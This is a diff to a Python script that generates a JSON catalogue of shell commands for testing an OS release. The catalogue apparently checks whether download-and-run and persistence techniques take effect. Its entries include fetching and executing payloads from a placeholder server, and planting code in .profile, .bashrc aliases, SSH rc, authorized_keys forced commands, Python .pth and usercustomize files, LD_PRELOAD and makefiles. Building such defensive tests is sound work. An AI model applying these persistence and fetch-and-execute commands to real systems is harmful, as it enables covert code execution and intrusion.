@@ -1,9 +1,9 @@
 # SPDX-License-Identifier: MIT
-"""Generate bindings/commands-0.70.json: tokens, per-variant native commands and probes.
+"""Generate bindings/commands-0.80.json: tokens, per-variant native commands and probes.
 
 Usage: python3 -I tools/make_commands.py [--interface FILE --executors FILE --base-conf FILE]
 The optional files are the release's INTERFACE.md, EXECUTORS.md and base.conf; their
-SHA-256 values are recorded. A variant whose facility does not exist in 0.70 is
+SHA-256 values are recorded. A variant whose facility does not exist in 0.80 is
 'unsupported' with the reason; it yields an unobserved row, never a refusal.
 
 Probe protocol (every shell probe below): exit 0 = the effect/thing is present,
@@ -15,7 +15,7 @@ import argparse, hashlib, json
 from pathlib import Path
 
 HERE = Path(__file__).resolve().parent.parent
-OUT = HERE / 'bindings' / 'commands-0.70.json'
+OUT = HERE / 'bindings' / 'commands-0.80.json'
 H = '/home/user'
 C = '/home/user/control'
 MARK = 'test -s "$CASE_MARKER"'
@@ -43,7 +43,7 @@ def setting(command, effect, note=''):
     return d
 
 
-NO_SERVICE = 'INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.70 has no service manager tool, '
+NO_SERVICE = 'INTERFACE 5/6: services exist only as service lines started at boot by the system; 0.80 has no service manager tool, '
 NOPKG = 'FORMAT.md "The tool": confpkg has build, install, info, verify, list, unowned, check, treesum; there is no '
 
 VARIANTS = {
@@ -64,7 +64,7 @@ VARIANTS = {
   'archive extract': v('case_fetch @SERVER@/payload.tar.gz @HOME@/brought.tgz && mkdir -p @HOME@/b && tar -xzf @HOME@/brought.tgz -C @HOME@/b && @HOME@/b/case-marker'),
   'self-extracting wrapper': v('case_fetch @SERVER@/selfextract.sh @HOME@/brought.sh && sh @HOME@/brought.sh'),
   'interpreter': v('case_fetch @SERVER@/payload.py @HOME@/brought.py && python3 @HOME@/brought.py'),
-  'container engine': un('PROGRAMS.md and EXECUTORS.md: no container runtime in 0.70; a brought engine is a brought executable, covered by "plain executable"'),
+  'container engine': un('PROGRAMS.md and EXECUTORS.md: no container runtime in 0.80; a brought engine is a brought executable, covered by "plain executable"'),
   'user/root': v('case_fetch @SERVER@/payload /root/brought && chmod +x /root/brought && /root/brought', 'root'),
  },
  'G-DOWNLOAD': {t: v('case_fetch @SERVER@/payload @TARGET@/brought && chmod +x @TARGET@/brought && @TARGET@/brought', TARGET=d)
@@ -93,7 +93,7 @@ VARIANTS = {
      '{ sh s.sh; python3 s.py; perl s.pl; gawk -f s.awk </dev/null; echo x | sed -f s.sed; make -f s.mk; m4 s.m4; } >/dev/null 2>&1; true',
      TARGET=H, note='one attempt per shipped reader of EXECUTORS.md: sh, python3, perl, gawk, sed, make, m4; a marker from any of them is a run'),
   'loader non-executable ELF': v('gcc @HOME@/case-marker.c -o @TARGET@/case-elf && chmod -x @TARGET@/case-elf && /lib64/ld-linux-x86-64.so.2 @TARGET@/case-elf', TARGET=H),
-  'debugger rc': v('cd @TARGET@ && printf "%s\\n" "import os; open(os.environ[\'CASE_MARKER\'], \'w\').write(\'executed\')" > .pdbrc && printf "c\\n" | python3 -m pdb /usr/lib/python3.13/this.py >/dev/null', TARGET=H),
+  'debugger rc': v('cd @TARGET@ && printf "%s\\n" "import os; open(os.environ[\'CASE_MARKER\'], \'w\').write(\'executed\')" > .pdbrc && printf "c\\n" | python3 -m pdb /usr/lib/@PYLIB@/this.py >/dev/null', TARGET=H),
   'runtime nested reader': v('perl -e \'do "@TARGET@/case-input.pl"; 1\'', TARGET=H),
   'explicit plugin': v('gcc -shared -fPIC @HOME@/case-marker-so.c -o @TARGET@/case-plugin.so && LD_PRELOAD=@TARGET@/case-plugin.so /usr/bin/true', TARGET=H),
   'temporary nested reader': v('python3 -c "import importlib.util as u, shutil, tempfile; d=tempfile.mkdtemp(dir=\'@TARGET@\'); p=d+\'/m.py\'; shutil.copy(\'@HOME@/case-input.py\', p); s=u.spec_from_file_location(\'m\', p); s.loader.exec_module(u.module_from_spec(s))"', TARGET='/tmp'),
@@ -108,14 +108,14 @@ VARIANTS = {
   'login profile': v('cat @HOME@/case-input >> @HOME@/.profile; cat @HOME@/case-input >> @HOME@/.bash_profile; true'),
   'logout': v('cat @HOME@/case-input >> @HOME@/.bash_logout; true'),
   'executable alias': v('printf "alias ls=\'. @HOME@/case-input\'\\n" >> @HOME@/.bashrc; true'),
-  'hook directory': un('no hook directory is read by any program of the 0.70 base (EXECUTORS.md); a package manager with hooks does not exist'),
+  'hook directory': un('no hook directory is read by any program of the 0.80 base (EXECUTORS.md); a package manager with hooks does not exist'),
   'autostart': un('no desktop and no autostart facility: COMMON decisions (the system boots into a terminal)'),
   'SSH rc': v('mkdir -p @HOME@/.ssh && cp @HOME@/case-input @HOME@/.ssh/rc; true', note='INTERFACE 3: the SSH server reads only /etc/dropbear/authorized_keys'),
   'authorized key login': v('mkdir -p @HOME@/.ssh && printf "command=\\". @HOME@/case-input\\" %s %s case-forced\\n" "@KEY_TYPE@" "@KEY@" >> @HOME@/.ssh/authorized_keys; true'),
-  'installer pre-invoke': un('no installer with pre-invoke hooks in 0.70 (FORMAT.md: packages run nothing at installation)'),
-  'editor rc': un('no editor in the 0.70 base (base.conf names none; EXECUTORS.md)'),
-  'plugin directory': v('d=@HOME@/.local/lib/python3.13/site-packages && mkdir -p $d && cp @HOME@/case-input.py $d/usercustomize.py; true'),
-  'plugin setting': v('d=@HOME@/.local/lib/python3.13/site-packages && mkdir -p $d && printf "import os; open(os.environ[\'CASE_MARKER\'], \'w\').write(\'executed\')\\n" > $d/case.pth; true'),
+  'installer pre-invoke': un('no installer with pre-invoke hooks in 0.80 (FORMAT.md: packages run nothing at installation)'),
+  'editor rc': un('no editor in the 0.80 base (base.conf names none; EXECUTORS.md)'),
+  'plugin directory': v('d=@HOME@/.local/lib/@PYLIB@/site-packages && mkdir -p $d && cp @HOME@/case-input.py $d/usercustomize.py; true'),
+  'plugin setting': v('d=@HOME@/.local/lib/@PYLIB@/site-packages && mkdir -p $d && printf "import os; open(os.environ[\'CASE_MARKER\'], \'w\').write(\'executed\')\\n" > $d/case.pth; true'),
   'saved macro home': v('printf "x := \\$(shell . @HOME@/case-input)\\n" > @HOME@/case.mk; true', note='MAKEFILES names makefiles read by every make run'),
   'saved macro tmp': v('printf "x := \\$(shell . @HOME@/case-input)\\n" > /tmp/case.mk; true'),
   'SSH ProxyCommand': v('dbclient -y -J "sh @HOME@/case-input" case-nowhere true </dev/null; true', note='dbclient -J runs the proxy command (EXECUTORS.md dbclient row)'),
@@ -145,16 +145,16 @@ VARIANTS = {
   'user persistent': un(NO_SERVICE + 'no per-user services'),
   'user transient': un(NO_SERVICE + 'no transient service units'),
   'delayed timer': un(NO_SERVICE + 'no timers'),
-  'user crontab': un('no cron in the 0.70 base (base.conf)'),
-  'root crontab': un('no cron in the 0.70 base (base.conf)'),
+  'user crontab': un('no cron in the 0.80 base (base.conf)'),
+  'root crontab': un('no cron in the 0.80 base (base.conf)'),
   'root service link': un(NO_SERVICE + 'no service link folder; the service table is a rendered file of the read-only image (writing it is W5-BREAK)'),
   'disable/mask recorded service': setting('pkill -x case-probe; sleep 3; true',
       'sleep 5; s=$(confos services) || exit 3; printf "%s\\n" "$s" | grep "^case-service" | grep -q " - "',
       'killing the process of a recorded service; effect present = the service stays stopped'),
   'linger': un(NO_SERVICE + 'no per-user session manager'),
-  'at': un('no at in the 0.70 base (base.conf)'),
+  'at': un('no at in the 0.80 base (base.conf)'),
   'service parameter': un(NO_SERVICE + 'no tool that changes the parameters of a service'),
-  'root crontab for another user': un('no cron in the 0.70 base (base.conf)'),
+  'root crontab for another user': un('no cron in the 0.80 base (base.conf)'),
  },
  'G-FIREWALL': {
   'add rule': setting('nft add rule inet confos input tcp dport 4444 drop',
@@ -338,7 +338,7 @@ def main():
                    'declarations/base.conf': sha(a.base_conf)}
     else:
         sources = old['sources']
-    data = {'schema': 1, 'release': '0.70', 'sources': sources, 'probe_protocol':
+    data = {'schema': 1, 'release': '0.80', 'sources': sources, 'probe_protocol':
             'exit 0 present, exit 1 absent, other status unobservable',
             'preludes': {'case_fetch': FETCH}, 'tokens': TOKENS, 'unsupported_tokens': UNSUPPORTED_TOKENS,
             'private_tokens': ['@SERVER@', '@KEY_TYPE@', '@KEY@'],
@@ -348,8 +348,17 @@ def main():
             'control_folder': C, 'xrec': XREC, 'removal': REMOVAL, 'changes': CHANGES,
             'server': SERVER, 'material': MATERIAL, 'controls': CONTROLS,
             'payload_sha256': {p.name: sha(p) for p in sorted((HERE / 'payloads').iterdir()) if p.is_file()}}
+    # @PYLIB@: the folder name of the python of the release (python3.MINOR), from the version that
+    # base.conf names, so a variant reads and writes the folders that python actually uses.
+    if a.base_conf:
+        ver = [l.split()[2] for l in Path(a.base_conf).read_text().splitlines() if l.startswith('package python ')][0]
+        pylib = 'python' + '.'.join(ver.split('.')[:2])
+    else:
+        pylib = old['python_lib']
+    data['python_lib'] = pylib
+    text = json.dumps(data, indent=1, sort_keys=True).replace('@PYLIB@', pylib)
     OUT.parent.mkdir(exist_ok=True)
-    OUT.write_text(json.dumps(data, indent=1, sort_keys=True) + '\n')
+    OUT.write_text(text + '\n')
     n = sum(len(x) for x in VARIANTS.values())
     u = sum('unsupported' in y or 'covered_by' in y for x in VARIANTS.values() for y in x.values())
     print('wrote', OUT.relative_to(HERE), len(VARIANTS), 'cases', n, 'variants', u, 'unsupported or covered')
